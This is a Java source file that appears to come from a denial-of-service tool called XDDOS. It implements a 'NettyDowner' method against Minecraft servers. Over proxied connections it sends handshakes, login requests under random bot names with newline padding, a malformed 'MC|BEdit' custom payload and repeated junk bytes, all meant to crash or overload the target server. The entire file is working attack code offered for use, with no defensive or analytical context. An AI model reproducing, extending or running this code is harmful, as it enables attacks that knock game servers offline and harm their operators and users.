package XD.XDDOS.methods.impl;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.packet.LoginRequest;
import XD.XDDOS.utils.packet.PacketUtils;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.security.SecureRandom;
import java.util.zip.Deflater;

public class NettyDowner
  implements IMethod
{
  private Handshake handshake;
  private byte[] bytes;
  private byte[] packet;

  public NettyDowner() {
    try {
      this.packet = compress(createCustomPayload("MC|BEdit", new byte[] { 0, 10, 1, 1, 0, 1, 0, 1, 0 }), 0);
    } catch (IOException e) {
      e.printStackTrace();
    }
    this.handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);
    this.bytes = this.handshake.getWrappedPacket();
  }

  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake.getWrappedPacket()));
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
    try {
      channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(String.valueOf((new SecureRandom()).nextInt(99999999)+"_XD"))).getWrappedPacket()));
      String nick = "XDDOS_F_" + (new SecureRandom()).nextInt(9999);
      bbbb.write(nick.length() + 2);
      bbbb.write(0);
      bbbb.write(nick.length());
      bbbb.writeBytes(nick);
      for (int var4 = 0; var4 < (this.handshake.getWrappedPacket()).length; var4++) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest("" + (new SecureRandom()).nextInt(9) + "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")).getWrappedPacket()));
        bbbb.write(var4);
      }
      for (int var9 = 0; var9 < 260; var9++) {
        bbbb.write(3);
        bbbb.write(0);
        bbbb.write(1);
        bbbb.write(49);
      }
    } catch (IOException ioException) {
      ioException.printStackTrace();
    }
    channel.writeAndFlush(b);
    channel.writeAndFlush(bbbb);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
  }

  public byte[] compress(byte[] packet, int threshold) throws IOException {
    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
    DataOutputStream out = new DataOutputStream(bytes);
    byte[] buffer = new byte[8192];
    if (packet.length >= threshold && threshold > 0) {
      byte[] data = new byte[packet.length];
      System.arraycopy(packet, 0, data, 0, packet.length);
      PacketUtils.writeVarInt(out, data.length);
      Deflater def = new Deflater();
      def.setInput(data, 0, data.length);
      def.finish();
      while (!def.finished()) {
        int i = def.deflate(buffer);
        out.write(buffer, 0, i);
      }
      def.reset();
    } else {
      PacketUtils.writeVarInt(out, 0);
      out.write(packet);
    }
    out.close();
    return bytes.toByteArray();
  }

  public byte[] createCustomPayload(String packet, byte[] input) throws IOException {
    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
    DataOutputStream out = new DataOutputStream(bytes);
    out.write(254);
    out.write(1);
    out.write(250);
    char[] achar = packet.toCharArray();
    out.writeShort(achar.length);
    out.write(input);
    byte[] data = bytes.toByteArray();
    bytes.close();
    return data;
  }

  public static void writePacket(byte[] packetData, ByteBufOutputStream out) throws IOException {
    writeVarInt(packetData.length, out);
    out.write(packetData);
  }

  public static void writeVarInt(int value, ByteBufOutputStream out) throws IOException {
    while ((value & 0xFFFFFF80) != 0) {
      out.writeByte(value & 0x7F | 0x80);
      value >>>= 7;
    }
    out.writeByte(value);
  }
}